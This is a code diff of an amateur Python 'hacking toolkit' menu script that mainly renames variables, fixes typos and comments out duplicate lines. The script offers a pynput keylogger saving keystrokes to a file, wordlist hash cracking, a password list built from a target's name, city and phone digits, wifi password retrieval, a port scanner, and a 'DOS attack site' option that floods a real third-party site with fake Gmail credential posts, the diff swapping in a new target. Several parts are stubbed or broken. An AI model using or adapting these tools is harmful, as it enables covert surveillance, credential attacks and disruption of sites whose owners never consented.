@@ -1,60 +1,49 @@
 # Alireza-adavi  (my full name)
 # It is recommended to use it in Kali Linux operating system
 # life (IRAN)
-#instagram (mof3r)
-import socket  # for number 1,8
-import random  # for number 2
-import string  # for number 2,24
-import pyfiglet  # for number 4
-import instaloader  # for number 5
-import phonenumbers  # for number6
-from phonenumbers import carrier  # for number6
-from phonenumbers import geocoder  # for number6
-import wikipedia  # for number 7
-import threading  # for number 9
-from datetime import datetime  # for number 9
-from queue import Queue  # for number 9
-import os  # for number 10,13
-import platform  # for number 11
-import psutil  # for number 11
-import GPUtil  # for number 11
-from tabulate import tabulate  # for number 11
-from playsound import playsound  # for number 12
+
+import hashlib  # for number 16
+# from playsound import playsound  # for number 12
 import os.path  # for number 13
+import platform  # for number 11
+import random  # for number 24
+import socket  # for number 1,8
+import string  # for number 2,24
+import subprocess  # for number 21
+import sys  # for number start(load)
+import threading  # for number 9
 import time  # for number 13
 import urllib.request
-from os import listdir  # for number 13
-from os.path import isfile, join  # for number 13
-import sys  # for number start(load)
-# import winsound                                                                                     #play sound
-from termcolor import colored, cprint  # color text
-import requests  # for number 14,24
-import webbrowser  # for number 14
-import pynput  # if u cant install use kali plz or set # or del           			    # for number 15
-from pynput.keyboard import Key, Listener  # for number 15
-import hashlib  # for number 16
-from urllib.request import urlopen  # for number 17
-import psutil  #
-from tabulate import tabulate  #
-import subprocess  # for number 21
 import urllib.request  # for number 22
-from bs4 import BeautifulSoup  # for number 23
-import random  # for number 24
+from datetime import datetime  # for number 9
+from queue import Queue  # for number 9
 from random import randint  # for number 24
+from urllib.request import urlopen  # for number 17
+
+import GPUtil  # for number 11
+import instaloader  # for number 5
+import phonenumbers  # for number6
+import psutil  #
+import pyfiglet  # for number 4
+import requests  # for number 14,24
+import wikipedia  # for number 7
 from bs4 import BeautifulSoup  # 25
-os.system('clear')  # change 'clear' to 'cls' if u use vscode in windows
-############################### START CODEING ################################
+from phonenumbers import carrier  # for number6
+from phonenumbers import geocoder  # for number6
+from pynput.keyboard import Key, Listener  # for number 15
+from tabulate import tabulate  #
+from termcolor import colored  # color text
+
+
+############################### START Coding ################################
 def menu():
     print("___________________________")
     print(colored("code by instagram: A_ir5", 'blue'))
     print("___________________________")
-    # time.sleep(3 )
-    print("Loading... ")
-    animation = ["[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]",
-                 "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
+    #time.sleep(3 )
     print("__________________________________")
     print(colored("[1]  get website IP", 'green'))
-    print("[2]  make password")
+    print("[2]  make random password")
     print(colored("[3]  search by google ", 'green'))
     print("[4]  logo with txt")
     print("[5]  Download instagram profile")
@@ -66,17 +55,17 @@ def menu():
     print("[11] show pc info ")
     print("[12] play mp3")
     print(colored("[13] [admin+robots+map] page-website finder", 'green'))
-    print(colored("[14] keyloger", 'green'))
+    print(colored("[14] keylogger", 'green'))
     print(colored("[15] hash MD5 find password", 'green'))
     print(colored("[16] test strong your pass ", 'green'))
-    print(colored("[17] passlist generate ", 'green'))
+    print(colored("[17] pass list generate ", 'green'))
     print(colored("[18] get info number", 'green'))
-    print("[19] Choose a password For social mdia")
+    print("[19] Choose a password For social media")
     print(colored("[20] NetworkScan", 'green'))
     print(colored("[21] get wifi password", 'green'))
     print(colored("[22] Get webpage contents", 'green'))
     print(colored("[23] Extract all the URLs from the webpage", 'green'))
-    print(colored("[24] DOS attack DATEBASE", 'green'))
+    print(colored("[24] DOS attack site", 'green'))
     print(colored("[25] find all website url", 'green'))
     print(colored("[26] strong password"))
     print("_____________________________________________")
@@ -87,6 +76,10 @@ print()
 # print("_____________________________________________")
 option = int(input("$ Enter your option: ==> "))
 ############################################################################
+def get_random_password_string():
+    pass
+
+
 if option == 1:
     print("______________________________________________________________")
     url = input("Enter the site :==> ")
@@ -94,25 +87,36 @@ if option == 1:
     print("IP site is :==>", socket.gethostbyname(url))
 ##############################################################################
 elif option == 2:
-    def get_random_password_string(length):
-        passeord_characters = string.ascii_letters + string.punctuation
-        password = ''.join(random.choice(passeord_characters) for i in range(length))
-        print("your password : ", password)
 
 
-    get_random_password_string(15)
+
+    def generate_password(options, length=12):
+        if options == 1:
+            characters = string.ascii_letters + string.digits
+        elif options == 2:
+            characters = string.ascii_letters + string.digits + string.punctuation
+        else:
+            return "Invalid option. Please choose 1 or 2."
+
+        passwords = ''.join(random.choice(characters) for _ in range(length))
+        return passwords
+
+
+    # Ask the user to choose an option
+    print("Please choose an option:")
+    print("1: Password with letters and numbers")
+    print("2: Password with letters, numbers, and special characters")
+    option = int(input("Enter your choice (1 or 2): "))
+
+    # Generate a random password based on the chosen option
+    random_password = generate_password(option)
+    print("Your random password is:", random_password)
+
+
 ##############################################################################
 elif option == 3:
 
-    try:
-        from googlesearch import search
-    except ImportError:
-        print("no module named 'google' found")
     print("________________________________________________________")
-    query = input("Enter any name or any word :==>")
-    print("________________________________________________________")
-    for j in search(query, tld="co.in", num=10, stop=20, pause=0):
-        print(j)
 ##############################################################################
 elif option == 4:
     print("________________________________________________________")
@@ -164,25 +168,25 @@ elif option == 9:
     t1 = datetime.now()
 
 
-    ## Using the range function to specify ports (here it will scans all ports between 1 and 1024)
+    ## Using the range function to specify ports (here it will scan all ports between 1 and 1024)
     ## We also put in some error handling for catching errors
     def scan(port):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # it use for Creates a stream socket
-            result = sock.connect_ex((ip, port))
-            if result == 0:
-                print("\n ((((((((Port %d Is Open)))))))" % (port))
+            result1 = sock.connect_ex((ip, port))
+            if result1 == 0:
+                print("\n ((((((((Port %d Is Open)))))))" % port)
                 sock.close()
             else:
-                print("\n Port %d Is Close :/ " % (port))
+                print("\n Port %d Is Close :/ " % port)
         except:
             pass
 
 
     def threader():
         while True:
-            worker = q.get()
-            scan(worker)
+            worker1 = q.get()
+            scan(worker1)
             q.task_done()
 
 
@@ -206,13 +210,13 @@ elif option == 10:
     os.system("shutdown /s /t 1")
 ##############################################################################
 elif option == 11:
-    def get_size(bytes, suffix="B"):
+    def get_size(bytes1, suffix="B"):
 
         factor = 1024
         for unit in ["", "K", "M", "G", "T", "P"]:
-            if bytes < factor:
-                return f"{bytes:.2f}{unit}{suffix}"
-            bytes /= factor
+            if bytes1 < factor:
+                return f"{bytes1:.2f}{unit}{suffix}"
+            bytes1 /= factor
 
 
     print("=" * 40, "System Information", "=" * 40)
@@ -289,8 +293,8 @@ elif option == 11:
     # Network information
     print("=" * 40, "Network Information", "=" * 40)
     # get all network interfaces (virtual and physical)
-    if_addrs = psutil.net_if_addrs()
-    for interface_name, interface_addresses in if_addrs.items():
+    if_adders = psutil.net_if_addrs()
+    for interface_name, interface_addresses in if_adders.items():
         for address in interface_addresses:
             print(f"=== Interface: {interface_name} ===")
             if str(address.family) == 'AddressFamily.AF_INET':
@@ -335,15 +339,7 @@ elif option == 11:
                                        "temperature", "uuid")))
 ##############################################################################
 elif option == 12:
-    # Input an existing wav filename
-    wavFile = input("Enter a wav filename: ")
-    # Play the wav file
-    playsound(wavFile)
-    # Input an existing mp3
-    print("______________________________________")
-    mp3File = input("Enter a mp3 filename: ")
-    # Play the mp3 file
-    playsound(mp3File)
+ print("hi")
 ######################################################################################################
 
 elif option == 13:
@@ -642,9 +638,9 @@ elif option == 14:
             keys = []
 
 
-    def save(keys):
+    def save(keys1s):
         with open("save.txt", "a") as file:
-            for key in keys:
+            for key in keys1s:
                 _key = str(key).replace("'", "")
                 if _key.find("space") > 0:
                     file.write("\n")
@@ -683,23 +679,23 @@ elif option == 15:
         print("password not in list plz try more list :) have good hacking :) ")
 ######################################################################################################
 elif option == 16:
-    def readwordlist(url):
+    def readwordlist(urls1):
         try:
-            wordlistfile = urlopen(url).read()
-        except Exception as e:
-            print("Hey there was some error while reading the wordlist, error:", e)
+            wordlist12 = urlopen(urls1).read()
+        except Exception as ew:
+            print("Hey there was some error while reading the wordlist, error:", ew)
             exit()
-        return wordlistfile
+        return wordlist12
 
 
-    def hash(wordlistpassword):
-        result = hashlib.sha1(wordlistpassword.encode())
-        return result.hexdigest()
+    def hash1(wordlistpassword):
+        result32 = hashlib.sha1(wordlistpassword.encode())
+        return result32.hexdigest()
 
 
-    def bruteforce(guesspasswordlist, actual_password_hash):
-        for guess_password in guesspasswordlist:
-            if hash(guess_password) == actual_password_hash:
+    def bruteforce(guesspasswordlist12, actual_password_hash11):
+        for guess_password in guesspasswordlist12:
+            if hash1(guess_password) == actual_password_hash11:
                 print("Hey! your password is:", guess_password,
                       "\n please change this, it was really easy to guess it (:")
                 # If the password is found then it will terminate the script here
@@ -708,8 +704,8 @@ elif option == 16:
 
     url = 'https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt'
     pass_st = input("Enter password :==> ")
-    actual_password = (pass_st)
-    actual_password_hash = hash(actual_password)
+    actual_password = pass_st
+    actual_password_hash = hash1(actual_password)
     wordlist = readwordlist(url).decode('UTF-8')
     guesspasswordlist = wordlist.split('\n')
     # Running the Brute Force attack
@@ -721,7 +717,7 @@ elif option == 17:
     a = input("name: ==>")
     b = input("last name: ==>")
     c = input("city: ==>")
-    d = input("contry: ==>")
+    d = input("country: ==>")
     e = input("some word for full number phone: ==>")
     f = input("last 4 number phone: ==>")
     # now start the password generate :)
@@ -778,7 +774,6 @@ elif option == 17:
     g51 = a + b + c
     g52 = a + b + d
     g53 = a + b + e
-    g53 = a + b + f
     g54 = a + c + a
     g55 = a + c + b
     g56 = a + c + c
@@ -1120,46 +1115,46 @@ elif option == 17:
     g393 = a + d + e + c
     g394 = a + d + e + d
     g395 = a + d + e + e
-    g356 = a + d + e + f
-    g357 = a + d + f + a
-    g358 = a + d + f + b
-    g359 = a + d + f + c
-    g360 = a + d + f + d
-    g361 = a + d + f + e
-    g362 = a + d + f + f
-    g363 = a + e + a + a
-    g364 = a + e + a + b
-    g365 = a + e + a + c
-    g366 = a + e + a + d
-    g367 = a + e + a + e
-    g368 = a + e + a + f
-    g369 = a + e + b + a
-    g370 = a + e + b + b
-    g371 = a + e + b + c
-    g372 = a + e + b + d
-    g373 = a + e + b + e
-    g374 = a + e + b + f
-    g375 = a + e + c + a
-    g376 = a + e + c + b
-    g377 = a + e + c + c
-    g378 = a + e + c + d
-    g379 = a + e + c + e
-    g380 = a + e + c + f
-    g381 = a + e + d + a
-    g382 = a + e + d + b
-    g383 = a + e + d + c
-    g384 = a + e + d + d
-    g385 = a + e + d + e
-    g386 = a + e + d + f
-    g387 = a + e + e + a
-    g388 = a + e + e + b
-    g389 = a + e + e + c
-    g390 = a + e + e + d
-    g391 = a + e + e + e
-    g392 = a + e + e + f
-    g393 = a + e + f + a
-    g394 = a + e + f + b
-    g395 = a + e + f + c
+    #g356 = a + d + e + f
+    #g357 = a + d + f + a
+    #g358 = a + d + f + b
+    #g359 = a + d + f + c
+    #g360 = a + d + f + d
+    #g361 = a + d + f + e
+    #g362 = a + d + f + f
+    #g363 = a + e + a + a
+    #g364 = a + e + a + b
+    #g365 = a + e + a + c
+    #g366 = a + e + a + d
+    #g367 = a + e + a + e
+    #g368 = a + e + a + f
+    #369 = a + e + b + a
+    #g370 = a + e + b + b
+    #g371 = a + e + b + c
+    #g372 = a + e + b + d
+    #g373 = a + e + b + e
+    #g374 = a + e + b + f
+    #g375 = a + e + c + a
+    #g376 = a + e + c + b
+    #g377 = a + e + c + c
+    #g378 = a + e + c + d
+    #g379 = a + e + c + e
+    #g380 = a + e + c + f
+    #g381 = a + e + d + a
+    #g382 = a + e + d + b
+    #g383 = a + e + d + c
+    #g384 = a + e + d + d
+    #g385 = a + e + d + e
+    ##g386 = a + e + d + f
+    #g387 = a + e + e + a
+    #g388 = a + e + e + b
+    #g389 = a + e + e + c
+    #g390 = a + e + e + d
+    #g391 = a + e + e + e
+    #g392 = a + e + e + f
+    #g393 = a + e + f + a
+    #g394 = a + e + f + b
+    #g395 = a + e + f + c
     g396 = a + e + f + d
     g397 = a + e + f + e
     g398 = a + e + f + f
@@ -1240,7 +1235,7 @@ elif option == 17:
     g523 = b + b + a + c
     g524 = b + b + a + d
     g525 = b + b + a + e
-    g525 = b + b + a + f
+    #g525 = b + b + a + f
     g526 = b + b + b + a
     g527 = b + b + b + b
     g528 = b + b + b + c
@@ -1252,52 +1247,52 @@ elif option == 17:
     g534 = b + b + c + c
     g535 = b + b + c + d
     g536 = b + b + c + e
-    g527 = b + b + c + f
-    g528 = b + b + d + a
-    g529 = b + b + d + b
-    g530 = b + b + d + c
-    g531 = b + b + d + d
-    g532 = b + b + d + e
-    g533 = b + b + d + f
-    g534 = b + b + e + a
-    g535 = b + b + e + b
-    g536 = b + b + e + c
+    #g527 = b + b + c + f
+    #g528 = b + b + d + a
+    #g529 = b + b + d + b
+    #g530 = b + b + d + c
+    #g531 = b + b + d + d
+    #g532 = b + b + d + e
+    #g533 = b + b + d + f
+    #g534 = b + b + e + a
+    #g535 = b + b + e + b
+    #g536 = b + b + e + c
     g537 = b + b + e + d
     g538 = b + b + e + e
     g539 = b + b + e + f
     g540 = b + b + f + a
     g541 = b + b + f + b
     g542 = b + b + f + c
-    g513 = b + b + f + d
-    g514 = b + b + f + e
-    g515 = b + b + f + f
-    g516 = b + c + a + a
-    g517 = b + c + a + b
-    g518 = b + c + a + c
-    g519 = b + c + a + d
-    g520 = b + c + a + e
-    g521 = b + c + a + f
-    g522 = b + c + b + a
-    g523 = b + c + b + b
-    g524 = b + c + b + c
-    g525 = b + c + b + d
-    g526 = b + c + b + e
-    g527 = b + c + b + f
-    g528 = b + c + c + a
-    g529 = b + c + c + b
-    g530 = b + c + c + c
-    g531 = b + c + c + d
-    g532 = b + c + c + e
-    g533 = b + c + c + f
-    g534 = b + c + d + a
-    g535 = b + c + d + b
-    g536 = b + c + d + c
-    g537 = b + c + d + d
-    g538 = b + c + d + e
-    g539 = b + c + d + f
-    g540 = b + c + e + a
-    g541 = b + c + e + b
-    g542 = b + c + e + c
+    #g513 = b + b + f + d
+    #g514 = b + b + f + e
+    #g515 = b + b + f + f
+    #g516 = b + c + a + a
+    #g517 = b + c + a + b
+    #g518 = b + c + a + c
+    ##g519 = b + c + a + d
+    #g520 = b + c + a + e
+    #g521 = b + c + a + f
+    #g522 = b + c + b + a
+    #g523 = b + c + b + b
+    #g524 = b + c + b + c
+    #g525 = b + c + b + d
+    #g526 = b + c + b + e
+    #g527 = b + c + b + f
+    #g528 = b + c + c + a
+    #g529 = b + c + c + b
+    #g530 = b + c + c + c
+    #g531 = b + c + c + d
+    #g532 = b + c + c + e
+    #g533 = b + c + c + f
+    #g534 = b + c + d + a
+    #g535 = b + c + d + b
+    #g536 = b + c + d + c
+    #g537 = b + c + d + d
+    #g538 = b + c + d + e
+    #g539 = b + c + d + f
+    #g540 = b + c + e + a
+    #g541 = b + c + e + b
+    #g542 = b + c + e + c
     g543 = b + c + e + d
     g544 = b + c + e + e
     g545 = b + c + e + f
@@ -1443,18 +1438,18 @@ elif option == 17:
     g685 = c + a + e + b
     g686 = c + a + e + c
     g687 = c + a + e + d
-    g678 = c + a + e + e
-    g679 = c + a + e + f
-    g680 = c + a + f + a
-    g681 = c + a + f + b
-    g682 = c + a + f + c
-    g683 = c + a + f + d
-    g684 = c + a + f + e
-    g685 = c + a + f + f
-    g686 = c + b + a + a
-    g687 = c + b + a + b
-    g688 = c + b + a + c
-    g689 = c + b + a + d
+    #g678 = c + a + e + e
+    #g679 = c + a + e + f
+    #g680 = c + a + f + a
+    #g681 = c + a + f + b
+    #g682 = c + a + f + c
+    #g683 = c + a + f + d
+    #g684 = c + a + f + e
+   # g685 = c + a + f + f
+    #g686 = c + b + a + a
+    #g687 = c + b + a + b
+    #g688 = c + b + a + c
+   # g689 = c + b + a + d
     g690 = c + b + a + e
     g691 = c + b + a + f
     g692 = c + b + b + a
@@ -1601,16 +1596,16 @@ elif option == 17:
     g833 = c + f + a + d
     g834 = c + f + a + e
     g835 = c + f + a + f
-    g826 = c + f + b + a
-    g827 = c + f + b + b
-    g828 = c + f + b + c
-    g829 = c + f + b + d
-    g830 = c + f + b + e
-    g831 = c + f + b + f
-    g832 = c + f + c + a
-    g833 = c + f + c + b
-    g834 = c + f + c + c
-    g835 = c + f + c + d
+    #g826 = c + f + b + a
+    #g827 = c + f + b + b
+   # g828 = c + f + b + c
+   # g829 = c + f + b + d
+   # g830 = c + f + b + e
+   # g831 = c + f + b + f
+   # g832 = c + f + c + a
+   # g833 = c + f + c + b
+   # g834 = c + f + c + c
+   # g835 = c + f + c + d
     g836 = c + f + c + e
     g837 = c + f + c + f
     g838 = c + f + d + a
@@ -1735,7 +1730,7 @@ elif option == 17:
     g967 = d + c + e + f
     g968 = d + c + f + a
     g969 = d + c + f + b
-    g969 = d + c + f + c
+    #g969 = d + c + f + c
     g970 = d + c + f + d
     g971 = d + c + f + e
     g972 = d + c + f + f
@@ -2103,8 +2098,8 @@ elif option == 17:
     g1335 = f + b + a + b
     g1336 = f + b + a + c
     g1337 = f + b + a + d
-    g1337 = f + b + a + e
-    g1337 = f + b + a + f
+    #g1337 = f + b + a + e
+    #g1337 = f + b + a + f
     g1338 = f + b + b + a
     g1339 = f + b + b + b
     g1340 = f + b + b + c
@@ -2213,7 +2208,7 @@ elif option == 17:
     g1443 = f + e + a + d
     g1444 = f + e + a + e
     g1445 = f + e + a + f
-    g1445 = f + e + b + a
+    #g1445 = f + e + b + a
     g1446 = f + e + b + b
     g1447 = f + e + b + c
     g1448 = f + e + b + d
@@ -2250,7 +2245,7 @@ elif option == 17:
     g1479 = f + f + a + e
     g1480 = f + f + a + f
     g1481 = f + f + b + a
-    g1481 = f + f + b + b
+    #g1481 = f + f + b + b
     g1482 = f + f + b + c
     g1483 = f + f + b + d
     g1484 = f + f + b + e
@@ -2951,8 +2946,8 @@ elif option == 17:
     print(g685)
     print(g686)
     print(g687)
-    print(g688)
-    print(g689)
+    #print(g688)
+    #print(g689)
     print(g690)
     print(g691)
     print(g692)
@@ -3829,6 +3824,10 @@ elif option == 20:
 
     class Network_Details(object):
         def __init__(self):
+            self.interfaces = None
+            self.address_ip = None
+            self.netmask_ip = None
+            self.broadcast_ip = None
             self.instance = psutil.net_if_addrs()
 
         def scanner(self):
@@ -3836,19 +3835,19 @@ elif option == 20:
             self.address_ip = []
             self.netmask_ip = []
             self.broadcast_ip = []
-            for interface_name, interface_addresses in self.instance.items():
-                self.interfaces.append(interface_name)
-                for address in interface_addresses:
-                    if str(address.family) == 'AddressFamily.AF_INET':
-                        self.address_ip.append(address.address)
-                        self.netmask_ip.append(address.netmask)
-                        self.broadcast_ip.append(address.broadcast)
-            data = {"Interface": [*self.interfaces],
+            for interface_name34, interface_addresses33 in self.instance.items():
+                self.interfaces.append(interface_name34)
+                for address1 in interface_addresses33:
+                    if str(address1.family) == 'AddressFamily.AF_INET':
+                        self.address_ip.append(address1.address)
+                        self.netmask_ip.append(address1.netmask)
+                        self.broadcast_ip.append(address1.broadcast)
+            dataqa = {"Interface": [*self.interfaces],
                     "IP-Address": [*self.address_ip],
                     "Netmask": [*self.netmask_ip],
                     "Broadcast-IP": [*self.netmask_ip]
-                    }
-            return tabulate(data, headers="keys", tablefmt="github")
+                      }
+            return tabulate(dataqa, headers="keys", tablefmt="github")
 
         def __str__(self):
             return str(self.scanner())
@@ -3879,8 +3878,8 @@ elif option == 22:
     print("____________________________")
     print("exp 'site.com/login'")
     print("____________________________")
-    sitepage = input("enter u site :==> ")
-    page = urllib.request.urlopen(sitepage)
+    sitepage1 = input("enter u site :==> ")
+    page = urllib.request.urlopen(sitepage1)
     print(page.read())
 ######################################################################################################
 elif option == 23:
@@ -3906,9 +3905,9 @@ elif option == 24:
             'passwd': (None, password),
         }
         print("+++++++++++++++++++++++++++++++++++++++++++++++")
-        print("Requets number: {}".format(i))
+        print("Requests number: {}".format(i))
         print("Gmail:{}\nPassword:{}".format('{}@gmail.com'.format(username), password))
-        response = requests.post("http://ali29.blogfa.com/", files=files)
+        response = requests.post("https://is-root.net/", files=files)
 ######################################################################################################
 elif option == 25:
     print("================================================")
